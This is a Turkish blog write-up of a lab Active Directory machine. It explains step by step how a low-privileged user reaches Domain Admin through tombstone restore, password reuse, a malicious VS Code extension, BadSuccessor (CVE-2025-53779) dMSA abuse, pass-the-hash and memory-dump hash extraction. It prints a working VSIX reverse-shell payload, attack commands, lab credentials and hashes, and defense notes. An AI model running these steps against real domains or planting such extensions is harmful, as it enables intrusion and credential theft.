---
title: "Silinmiş Bir Object'den Domain Admin'e: BadSuccessor (CVE-2025-53779) ve dMSA Abuse'ünün Anatomisi"
date: 2026-07-10 09:00:00 +0300
categories: [Active Directory]
tags: [pentest, kerberos, dmsa, badsuccessor, cve-2025-53779, active-directory, redteam]
---

Bu yazı bir walkthrough değil. Amacım, Windows Server 2025'in yeni delegated Managed Service Account (dMSA) feature'ı üzerinden kurulan BadSuccessor attack vector'ünü, öncesindeki ve sonrasındaki halkalarla birlikte hangi mekanizmaya dayandığı ve neden mümkün olduğu üzerinden açıklamak. Komutlar sadece örnek; asıl mesele altta yatan directory ve protocol davranışları.

Modern bir Active Directory saldırısı tek bir exploit değildir; her biri tek başına düşük riskli görünen bir dizi zayıflığın üst üste binmesidir. Elimizde yalnızca düşük yetkili bir domain user'ının credential'ı (`alex.turner : Checkpoint2024!`) var ve bununla Domain Admin'e ulaşacağız. Zincirin tamamı şöyle:

```
[0] BloodHound (ilk enum) ──► kullanışlı path yok (tombstone grafikte değil)
                                                      │
[1] bloodyAD get writable ──► WRITE on Deleted Objects ──► mark.davies restore
                                                      │
[2] password reuse: mark.davies aynı parolayı kullanıyor
    + BloodHound (2. enum) ──► alex→mark, mark→svc_deploy GenericWrite görünür
                                                      │
[3] mark.davies  ──WRITE on DevDrop share──►  malicious VSIX ──► ryan.brooks shell
                                                      │
[4] ryan.brooks  ──CREATE_CHILD on OU──►  BadSuccessor ──► svc_deploy hash
                                                      │
[5] svc_deploy   ──PtH──►  VMBackups ──► .vmem memory dump ──► Administrator hash
                                                      │
[6] Administrator ──PtH──►  DOMAIN ADMIN
```

Her halkayı, "ne yaptık" değil "neden işe yaradı" sorusuyla açalım.

## Halka 1 — Deleted Object'i Restore Etmek: Tombstone ve isDeleted Mekaniği

### Önce BloodHound: boş çıkan ilk enum

Standart başlangıç, tüm domain'i BloodHound'a dökmek. bloodyAD bunu bir collector kurmadan, sadece LDAP üzerinden yapabiliyor:

```
bloodyAD -d checkpoint.htb --host dc01.checkpoint.htb -u alex.turner -p '<pass>' get bloodhound
# [+] Bloodhound data saved to <timestamp>_Bloodhound.zip
```

Grafiği açıp alex.turner'dan çıkan yolları incelediğimizde kullanışlı bir attack path yok: outbound object control boş, ilginç bir grup üyeliği veya session görünmüyor. Yani BloodHound bu aşamada bizi bir yere götürmüyor — ama bu, "yol yok" demek değil; sadece henüz grafikte olmayan bir şey var.

### bloodyAD: yazma yetkilerini taramak

BloodHound tıkanınca, ACL'lere daha ham bir açıdan bakıyoruz. bloodyAD'in `get writable` module'ü, mevcut user'ın DACL'de WRITE/CREATE_CHILD gibi hakları olduğu object'leri listeler:

```
┌──(kali㉿kali)-[~/Desktop/checkpoint]
└─$ bloodyAD --host dc01.checkpoint.htb -d checkpoint.htb -u alex.turner -p 'Checkpoint2024!' get writable
distinguishedName: CN=Deleted Objects,DC=checkpoint,DC=htb
DACL: WRITE
distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=checkpoint,DC=htb
permission: WRITE
distinguishedName: OU=Employees,DC=checkpoint,DC=htb
permission: CREATE_CHILD
distinguishedName: CN=Alex Turner,OU=Employees,DC=checkpoint,DC=htb
permission: WRITE
distinguishedName: CN=Mark Davies\0ADEL:2217e877-e2a2-47d7-91d4-99ede36f367e,CN=Deleted Objects,DC=checkpoint,DC=htb
permission: WRITE
distinguishedName: DC=checkpoint.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=checkpoint,DC=htb
permission: CREATE_CHILD
distinguishedName: DC=_msdcs.checkpoint.htb,CN=MicrosoftDNS,DC=ForestDnsZones,DC=checkpoint,DC=htb
permission: CREATE_CHILD
```

İlgi çekici satır:

```
distinguishedName: CN=Deleted Objects,DC=checkpoint,DC=htb
DACL: WRITE
```

alex.turner, Deleted Objects container'ı üzerinde yazma hakkına sahip. BloodHound bunu öne çıkarmamıştı çünkü ilgilendiğimiz asıl object (silinmiş bir user) grafikte hiç yoktu — tombstone'lar varsayılan collection'a girmez. Bu tek satır saldırının kapısını açıyor.

### Neden bu bir zafiyet?

Bir object AD'de silindiğinde diskten anında yok olmaz. AD, "yanlışlıkla silineni geri getirebilmek" için bir yaşam döngüsü uygular:

1. Object silinir → `isDeleted=TRUE` işaretlenir ve `CN=Deleted Objects` container'ına taşınır. Buna tombstone (mezar taşı) denir.
2. Tombstone lifetime boyunca (default 180 gün) bu haliyle bekler. AD Recycle Bin aktifse, object'in çoğu attribute'u da korunur — yani geri getirilebilir bir "yarı-canlı" haldedir.
3. Süre dolunca fiziksel olarak temizlenir.

Kritik nokta: Deleted Objects üzerinde yazma hakkı olan biri, bir tombstone'u restore edebilir. Restore, teknik olarak tek bir LDAP modify işlemidir — `isDeleted` attribute'u kaldırılır, object `lastKnownParent` değerine göre canlı bir OU'ya geri taşınır.

### Bir tuzak: DN içindeki `\0A`

Deleted object'lerin DN'i tuhaf görünür:

```
CN=Mark Davies\0ADEL:2217e877-e2a2-47d7-91d4-99ede36f367e,CN=Deleted Objects,...
```

Buradaki `\0A` düz metin değil — DN string encoding'inde gerçek bir `0x0A` (newline) byte'ının gösterimidir. AD, silinen object'in adına çakışmayı önlemek için `\n + DEL:<objectGUID>` ekler. Bu detay pratikte önemli: DN'i elle bir LDAP filter'a gömersen escaping bir kat daha katlanır (`\\0A`) ve object bulunamaz. Tombstone hedeflerken DN yerine objectGUID kullanmak çok daha güvenlidir.

### Restore

```
┌──(kali㉿kali)-[~/Desktop/checkpoint]
└─$ bloodyad -H 10.129.35.106 -d checkpoint.htb -u alex.turner -p 'Checkpoint2024!' set restore "CN=Mark Davies\0ADEL:2217e877-e2a2-47d7-91d4-99ede36f367e,CN=Deleted Objects,DC=checkpoint,DC=htb"
[+] CN=Mark Davies\0ADEL:2217e877-e2a2-47d7-91d4-99ede36f367e,CN=Deleted Objects,DC=checkpoint,DC=htb has been restored successfully under CN=Mark Davies,OU=Employees,DC=checkpoint,DC=htb
```

mark.davies artık OU=Employees altında yeniden canlı. Peki neden bu user'ı istiyoruz? Cevap bir sonraki halkada.

> Defense: Deleted Objects üzerinde yazma hakkı yalnızca en yüksek yetkili hesaplarda olmalı. Restore işlemleri Event ID 5136'da isDeleted attribute değişikliği olarak izlenebilir. Gereksinimler el veriyorsa tombstone lifetime'ı kısaltmak saldırı penceresini daraltır.
{: .prompt-tip }

## Halka 2 — Password Reuse: En Sıkıcı ama En Etkili Halka

Restore ettiğimiz mark.davies'in parolasını bilmiyoruz. Ama en klasik hatayı deniyoruz: elimizdeki parola başka bir hesapta da geçerli mi?

```
nxc smb <dc-ip> -u Mark.Davies -p 'Checkpoint2024!'
# [+] checkpoint.htb\Mark.Davies:Checkpoint2024!   ← başarılı
```

Aynı parola iki hesapta ortak. Tek denemeyle yeni bir identity kazandık.

### Neden mark.davies değerli? — İkinci BloodHound enum'u

İşte ilk BloodHound'un neden boş çıktığı burada anlam kazanıyor: mark.davies restore edilene kadar grafikte var olmayan bir object'ti, dolayısıyla ona giden/ondan çıkan hiçbir kenar (edge) görünmüyordu. Restore ile object canlandığı için, AD'yi tekrar dump edip baktığımızda daha önce görünmeyen iki kritik outbound control ilişkisi ortaya çıkıyor:

- `alex.turner ──GenericWrite──► mark.davies` (bu yüzden restore edebildik/kontrol ediyoruz)
- `mark.davies ──GenericWrite──► svc_deploy` (Outbound Object Control: 1)

GenericWrite, bir object'in çoğu attribute'unu değiştirebilme hakkıdır — shadow credentials, SPN ekleme, veya (birazdan göreceğimiz gibi) başka primitive'ler için kullanılabilir. Ama bu makinede mark.davies'in asıl açtığı kapı bir share.

> Defense: Fine-Grained Password Policies (FGPP), yaygın parolaları engelleyen bir password filter (ör. Azure AD Password Protection), ve DSInternals ile periyodik parola reuse denetimi.
{: .prompt-tip }

## Halka 3 — Supply Chain: Malicious VSIX ile İlk Shell

### Share enumeration

mark.davies ile share'ları listeliyoruz:

```
nxc smb <dc-ip> -u Mark.Davies -p 'Checkpoint2024!' --shares
SMB         10.129.36.39    445    DC01             DevDrop         READ,WRITE      VS Code extensions share for approved .vsix packages compatible with VS Code engine 1.118.0
```

DevDrop, "onaylı" VS Code eklentilerinin bırakıldığı, yazma yetkisi olan herkesin paket koyabildiği bir depo. Remark'taki "engine 1.118.0" ipucu: karşıda bu eklentileri yükleyen bir kurban (otomasyon veya kullanıcı) var. Bu klasik bir supply chain zafiyeti — güvenilir sanılan bir kanaldan kurbanın makinesinde kod çalıştırmak.

### VSIX neden bir execution vector'ü?

Bir `.vsix` özünde bir ZIP arşividir — VS Code onu açar, içindeki manifest'i okur ve eklentinin kodunu yükler. Eklenti yaşam döngüsünü belirleyen dosya `package.json`'dır. Bizim için önemli olan üç dosya var ve arşivde şu yapıda dizilmeleri gerekir:

```
evil.vsix  (ZIP)
├── [Content_Types].xml      ← arşiv KÖKÜNDE (VS Code'un dosya tiplerini tanıması için zorunlu)
└── extension/               ← tüm eklenti içeriği bu klasörün İÇİNDE
    ├── package.json         ← manifest: eklenti nasıl ve ne zaman çalışacak
    └── extension.js         ← payload: activate() içindeki kod
```

Bu üç dosyaya ne yazdığımıza tek tek bakalım.

**1) `extension/package.json` — manifest.** Eklentinin kimliğini ve en kritik olarak ne zaman çalışacağını burada tanımlarız:

```json
{
  "name": "devtool",
  "displayName": "DevTools Helper",
  "version": "1.0.0",
  "engines": { "vscode": "^1.118.0" },
  "activationEvents": ["*"],
  "main": "./extension.js"
}
```

İki alan hayati: `activationEvents: ["*"]`, eklentinin VS Code açılır açılmaz (hiçbir kullanıcı etkileşimi beklemeden) aktive olması demektir. `main` ise aktive olunca yüklenecek JS dosyasını gösterir. `engines.vscode` de hedefe uymalı — DevDrop'un remark'ı "compatible with VS Code engine 1.118.0" diyordu, o yüzden `^1.118.0` yazdık; uyumsuz sürüm eklentinin reddedilmesine yol açabilir.

**2) `extension/extension.js` — payload.** VS Code, aktive olan eklentinin `activate()` fonksiyonunu çağırır. Yani "eklentiyi yükle" = "bu `activate()`'i çalıştır". Payload tam buraya girer:

```js
const cp = require('child_process');
exports.activate = function () {
  cp.exec('powershell -e <base64_reverse_shell>');
};
exports.deactivate = function () {};
```

Eklenti Node.js runtime'ında çalıştığı için `child_process` gibi tam Node API'lerine erişimimiz var — bu da keyfi komut çalıştırma demektir.

**3) `[Content_Types].xml` — arşiv metadata'sı.** VS Code'un paket içindeki uzantıları (.js, .json) doğru MIME tipiyle tanıması için gereken, kökte duran zorunlu dosya:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
  <Default Extension="js" ContentType="application/javascript"/>
  <Default Extension="json" ContentType="application/json"/>
</Types>
```

### Paketleme: dizin yapısı en kritik incelik

`.vsix`'in geçerli açılabilmesi için ZIP'i doğru yapıda oluşturmak şart: `[Content_Types].xml` arşiv kökünde, `package.json` ve `extension.js` ise `extension/` klasörünün içinde olmalı. Sık yapılan hata, kod dosyalarını `extension/` dışında bırakmaktır — bu durumda `main: "./extension.js"` yolu tutmaz ve eklenti yüklenmez.

Doğru şekilde paketleme:

```bash
mkdir -p evil-ext/extension
# package.json ve extension.js -> evil-ext/extension/ içine
# [Content_Types].xml       -> evil-ext/ köküne
cd evil-ext
zip -r ../evil.vsix "[Content_Types].xml" extension/
```

Dikkat: `[Content_Types].xml` adındaki köşeli parantezler bash'te glob (joker) olarak yorumlanır; zip "name not matched" uyarısı verip dosyayı arşive eklemez. Bu yüzden dosya adını tırnak içine almak (`"[Content_Types].xml"`) gerekir — aksi halde eksik arşiv üretirsin.

> Defense: Eklenti/paket depoları signed + verified olmalı. "Herkes yazabilir" bir share, executable içerik için asla güvenli değildir. WDAC/AppLocker ile application whitelisting ve eklenti kaynak kısıtlaması bu vektörü kapatır.
{: .prompt-tip }

Paket, mark.davies'in write hakkıyla DevDrop'a yüklenir:

```
smbclient -U mark.davies%'<pass>' //<dc-ip>/DevDrop -c 'put evil.vsix'
```

Kurban eklentiyi yüklediğinde listener'a shell düşer. Ben `penelope` listener kullandım:

```
[+] Got reverse shell from DC01 ...
PS C:\Program Files\Microsoft VS Code> whoami
checkpoint\ryan.brooks          ← shell ryan.brooks bağlamında geldi
```

Artık ryan.brooks'uz — ve bu user, zincirin kalbindeki adımın anahtarı.

## Halka 4 — BadSuccessor (CVE-2025-53779): Chain'in Kalbi

### ryan.brooks shell sonrası: üçüncü BloodHound bakışı

Shell'i ryan.brooks bağlamında aldıktan sonra grafiği bu yeni kimlik açısından tekrar inceliyoruz. BloodHound bu sefer ryan.brooks'un svc_deploy service account'u üzerinde GenericWrite hakkı olduğunu gösteriyor:

```
ryan.brooks ──GenericWrite──► svc_deploy (Outbound Object Control)
```

Bu, svc_deploy'a giden yolun teyidi. Ancak svc_deploy klasik bir user olsaydı burada shadow credentials veya targeted kerberoast yeterdi. İşin ilginç yanı, hedef ortamın Server 2025 olması ve ryan.brooks'un bir OU üzerinde de yetkisinin bulunması — bu da çok daha güçlü bir primitive'in, BadSuccessor'ın kapısını açıyor.

### Ön koşul: tek bir OU üzerinde CREATE_CHILD

ryan.brooks olarak, hangi OU'da object oluşturabildiğimizi doğruluyoruz. nxc'nin `badsuccessor` module'ü domain'i tarayıp bu izne sahip principal'ları listeler:

```
┌──(kali㉿kali)-[~/Desktop/Tools/penelope]
└─$ nxc ldap 10.129.36.137 -u Mark.Davies -p 'Checkpoint2024!' -M badsuccessor
LDAP        10.129.36.137   389    DC01             [*] Windows 11 / Server 2025 Build 26100 (name:DC01) (domain:checkpoint.htb) (signing:Enforced) (channel binding:No TLS cert)
LDAP        10.129.36.137   389    DC01             [+] checkpoint.htb\Mark.Davies:Checkpoint2024!
BADSUCCE... 10.129.36.137   389    DC01             [+] Found domain controller with operating system Windows Server 2025: 10.129.36.137 (DC01.checkpoint.htb)
BADSUCCE... 10.129.36.137   389    DC01             [+] Found 2 results
BADSUCCE... 10.129.36.137   389    DC01             alex.turner (S-1-5-21-3129162710-3498938529-1807524340-1101), OU=Employees,DC=checkpoint,DC=htb
BADSUCCE... 10.129.36.137   389    DC01             ryan.brooks (S-1-5-21-3129162710-3498938529-1807524340-1103), OU=DMSAHolder,DC=checkpoint,DC=htb
```

Hedefte çalıştırılan `Get-BadSuccessorOUPermissions.ps1` de aynı sonucu doğrular:

```
CHECKPOINT\ryan.brooks {OU=DMSAHolder,DC=checkpoint,DC=htb}   ← CREATE_CHILD
CHECKPOINT\alex.turner {OU=Employees,DC=checkpoint,DC=htb}
```

BadSuccessor'ın gerektirdiği tek ve minimum izin budur: bir OU içinde child object yaratabilmek. Domain Admin olmak, özel bir hak — hiçbiri gerekmiyor.

### dMSA ve "successor" mekanizması — zafiyetin özü

delegated Managed Service Account (dMSA), Server 2025 ile gelen bir hesap türü. Amacı, eski (parolası elle yönetilen, riskli) service account'lardan modern otomatik-yönetilen hesaplara göç (migration) yapmayı kolaylaştırmak.

Migration senaryosu şöyle tasarlanmış: eski bir service account'u bir dMSA ile değiştirdiğinde, dMSA o hesabın successor'ı (halefi) olur. Authentication'ın kesintisiz devam etmesi için, KDC successor dMSA'ya ticket verirken predecessor'ın (eski hesabın) key material'ini de o ticket'a dahil eder. Mantık: "hesap göç(migrate) etti ama eski key'ler bir süre daha geçerli olsun."

Bu migration ilişkisi iki LDAP attribute'uyla kurulur:

| Attribute | Anlamı |
|---|---|
| `msDS-ManagedAccountPrecededByLink` | dMSA'nın predecessor'ı kim? (hedef hesabın DN'i) |
| `msDS-DelegatedMSAState` | Göç durumu (2 = migration tamamlandı) |

Zafiyetin kökü: KDC, bu göçün gerçekten meşru olup olmadığını doğrulamaz. Yani bir attacker bir OU'da yeni bir dMSA yaratabiliyorsa, PrecededByLink attribute'unu istediği herhangi bir hesabı (bir Domain Admin dahil) işaret edecek şekilde kendisi set edebilir ve state'i "tamamlandı" gösterebilir. KDC bunu sorgusuz kabul eder ve dMSA'ya ait ticket'a hedef hesabın anahtarlarını koyar.

Sonuç: hedef hesabın parolasını hiç bilmeden, Kerberoast veya password cracking yapmadan, onun key material'ini KDC'nin kendisi teslim eder.

### İki alt adım

**(a) ryan.brooks için parolasız TGT.** Elimizde shell var ama parola yok. Rubeus'un `tgtdeleg` trick'i, Kerberos GSS-API'yi delegation flag'iyle kandırıp mevcut logon session'ının forwarded TGT'sini authenticator içinden çeker — parola gerektirmez:

```
.\Rubeus.exe tgtdeleg /nowrap
```

Base64 kirbi'yi Kali'de kullanılabilir `.ccache`'e çeviriyoruz:

```bash
cat ryan64.kirbi | base64 -d > ryan.kirbi
impacket-ticketConverter ryan.kirbi ryan.ccache
export KRB5CCNAME=ryan.ccache
```

**(b) Kötücül dMSA'yı yaratıp anahtarları çekmek.** bloodyAD'in `badSuccessor` module'ü üç işi tek adımda yapar: OU'da `evil-dmsa$` oluştur, `PrecededByLink`'i svc_deploy'a bağla, dMSA için TGT alıp predecessor anahtarlarını çıkar:

```bash
bloodyAD --host dc01.checkpoint.htb -d checkpoint.htb -u ryan.brooks \
  -k ccache=$PWD/ryan.ccache \
  add badSuccessor evil-dmsa \
  -t 'CN=SVC_DEPLOY,OU=SERVICEACCOUNTS,DC=CHECKPOINT,DC=HTB' \
  --ou 'OU=DMSAHolder,DC=checkpoint,DC=htb'
```

Kritik çıktı: "previous keys"

```
dMSA current keys found in TGS:
  AES256: 59bf49cd...   RC4: c6c42af2...          ← evil-dmsa'nın kendi anahtarları (işe yaramaz)
dMSA previous keys found in TGS (including keys of preceding managed accounts):
  RC4: e16081eb077aca74bdbf8af12af43ac9           ← svc_deploy'un NTLM hash'i ✔
```

"current keys" yeni yarattığımız `evil-dmsa$`'e ait, değersiz. "previous keys" ise KDC'nin "predecessor" saydığı svc_deploy'un RC4/NTLM hash'i. Düşük yetkili bir user, tek bir OU'da object yaratma hakkıyla, bir service account'un hash'ini ele geçirdi.

> Defense (CVE-2025-53779):
> - Patch: Ağustos 2025 Patch Tuesday bu CVE'yi kapatır — öncelikli.
> - OU izinleri: CREATE_CHILD hakkı olan principal'ları audit et; saldırının minimum şartı bu.
> - Monitoring: Yeni `msDS-DelegatedManagedServiceAccount` object'lerini, özellikle `msDS-ManagedAccountPrecededByLink`'i privileged bir hesaba işaret ediyorsa alarma bağla.
> - Disable: dMSA gerekmiyorsa feature'ı kullanma.
{: .prompt-warning }

## Halka 5 — Service Account'tan Memory Forensics'e

### svc_deploy ile Pass-the-Hash

Elde ettiğimiz NTLM hash'iyle parola olmadan authenticate oluyoruz (Pass-the-Hash):

```
netexec smb <dc-ip> -u svc_deploy -H e16081eb077aca74bdbf8af12af43ac9
# [+] checkpoint.htb\svc_deploy:... (başarılı)
```

Bu hesap, önceden erişemediğimiz VMBackups share'ini READ olarak açıyor. İçinde bir VMware snapshot'ı var:

```
└─$ netexec smb 10.129.45.190 -u svc_deploy -H e16081eb077aca74bdbf8af12af43ac9 --shares
SMB         10.129.45.190   445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:checkpoint.htb) (signing:True) (SMBv1:None)
SMB         10.129.45.190   445    DC01             [+] checkpoint.htb\svc_deploy:e16081eb077aca74bdbf8af12af43ac9
SMB         10.129.45.190   445    DC01             [*] Enumerated shares
SMB         10.129.45.190   445    DC01             Share           Permissions     Remark
SMB         10.129.45.190   445    DC01             -----           -----------     ------
SMB         10.129.45.190   445    DC01             ADMIN$                          Remote Admin
SMB         10.129.45.190   445    DC01             C$                              Default share
SMB         10.129.45.190   445    DC01             DevDrop                         VS Code extensions share for approved .vsix packages compatible with VS Code engine 1.118.0
SMB         10.129.45.190   445    DC01             IPC$            READ            Remote IPC
SMB         10.129.45.190   445    DC01             NETLOGON        READ            Logon server share
SMB         10.129.45.190   445    DC01             SYSVOL          READ            Logon server share
┌──(kali㉿kali)-[~/Desktop/checkpoint]
└─$ smbclient //10.129.45.190/VMBackups   -U 'checkpoint.htb/svc_deploy%e16081eb077aca74bdbf8af12af43ac9' --pw-nt-hash
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat May  9 13:15:22 2026
  ..                                  D        0  Sat May  9 10:42:27 2026
  NightlyBackup_2024-11-01            D        0  Sat May  9 12:54:19 2026
        10459391 blocks of size 4096. 2451576 blocks available
smb: \> cd NightlyBackup_2024-11-01
smb: \NightlyBackup_2024-11-01\> ls
  .                                   D        0  Sat May  9 12:54:19 2026
  ..                                  D        0  Sat May  9 13:15:22 2026
  memory forensics                    D        0  Sat May  9 13:12:44 2026
smb: \NightlyBackup_2024-11-01\> cd "memory forensics"
smb: \NightlyBackup_2024-11-01\memory forensics\> ls
  .                                   D        0  Sat May  9 13:12:44 2026
  ..                                  D        0  Sat May  9 12:54:19 2026
  Windows Server 2019-000001.vmdk      A 106496000  Sat May  9 22:45:22 2026
  Windows Server 2019-Snapshot1.vmem      A 2147483648  Sat May  9 22:40:36 2026
  Windows Server 2019-Snapshot1.vmsn      A 138164859  Sat May  9 22:40:36 2026
  Windows Server 2019.nvram           A   270840  Sat May  9 22:39:00 2026
  Windows Server 2019.scoreboard      A     7642  Sat May  9 22:45:22 2026
  Windows Server 2019.vmdk            A 10199695360  Sat May  9 22:39:00 2026
  Windows Server 2019.vmsd            A      502  Sat May  9 22:39:00 2026
  Windows Server 2019.vmx             A     2749  Sat May  9 22:45:22 2026
  Windows Server 2019.vmxf            A      274  Sat May  9 22:22:44 2026
```

`Windows Server 2019-Snapshot1.vmem` ~2 GB — memory dump; `Windows Server 2019-Snapshot1.vmsn` ~138 MB — snapshot metadata.

### .vmem neden altın değerinde?

`.vmem`, sanal makinenin snapshot anındaki ham RAM imajıdır. RAM, o an sistemde çözülmüş (decrypted) halde duran her şeyi içerir — ve en kritik olan şu: bellekte tutulan registry hive'ları (SAM, SYSTEM, SECURITY).

Neden bu önemli? Disk'teki SAM veritabanı, SYSTEM hive'ındaki boot key (SysKey) ile şifrelidir; ikisi bir arada olmadan hash'ler okunamaz. Ama bir memory dump'ında her ikisi de aynı anda bulunur. Yani belleği alan, SAM'i offline olarak decrypt edip tüm local NTLM hash'lerini çıkarabilir.

### İndirme ve analiz

Büyük dosya transferinde `NT_STATUS_IO_TIMEOUT` olursa smbclient'i büyük dosyaya uygun socket option'larıyla başlat:

```bash
smbclient //<dc-ip>/VMBackups -U 'checkpoint.htb/svc_deploy%<hash>' --pw-nt-hash \
  --socket-options='TCP_NODELAY SO_RCVBUF=131072 SO_SNDBUF=131072' -t 60 \
  -c 'lcd .; cd "NightlyBackup_2024-11-01\memory forensics"; get "Windows Server 2019-Snapshot1.vmem"'
```

Volatility 3 ile önce profili doğrula, sonra hash'leri dump'la:

```bash
python3 -m venv .venv-vol
.venv-vol/bin/pip install volatility3 pycryptodomex
# Profil: Is64Bit=True, Major/Minor=15.17763 (Server 2019), NtProductServer
.venv-vol/bin/vol -q -f "Windows Server 2019-Snapshot1.vmem" windows.info.Info
# SAM'i boot key ile decrypt edip NTLM hash'leri çıkar
.venv-vol/bin/vol -q -f "Windows Server 2019-Snapshot1.vmem" windows.hashdump.Hashdump
```

`hashdump` çıktısındaki Administrator satırı bize domain'in anahtarını verir.

> Not: Volatility, `.vmem` yanında `.vmsn`/`.vmss` metadata dosyasını arar ve yoksa uyarı basar; bu dumpta bilgiler metadata olmadan da okunabildi. Okunamazsa `.vmsn`'i aynı klasöre aynı isimle koymak yeterli.
{: .prompt-tip }

> Defense: VM backup'ları içindeki memory snapshot'lar plaintext credential barındırır. Yedekleri platform seviyesinde şifrele (vSphere VM Encryption), backup share'lerine erişimi Tier 0 asset gibi kısıtla, snapshot sonrası credential'ları rotate et.
{: .prompt-warning }

## Halka 6 — Final: Administrator Pass-the-Hash

Bellekten çıkan Administrator NTLM hash'iyle doğrudan Domain Admin:

```bash
netexec smb <dc-ip> -u administrator -H <admin_nt_hash>
# (Pwn3d!)
evil-winrm-py -i <dc-ip> -u administrator -H <admin_nt_hash>
```

Domain düştü.

## Sonuç

BadSuccessor, "yeni feature = yeni attack surface" ilkesinin ders niteliğinde örneği. dMSA gibi meşru bir kolaylık, migration ilişkisinin doğrulanmasındaki tek bir kusur yüzünden, bir OU üzerinde object yaratma hakkını tam privilege escalation'a çeviriyor. Ama bu vektörün Domain Admin'e ulaşabilmesi için önünde beş ayrı güvenlik zayıflığın daha hizalanması gerekti.

Alınacak asıl ders: güvenlik en zayıf tek halkadan değil, birbirini besleyen halkaların toplamından kırılır. Tek bir yama, tek bir sıkı politika bu zincirin herhangi bir yerini keserdi.
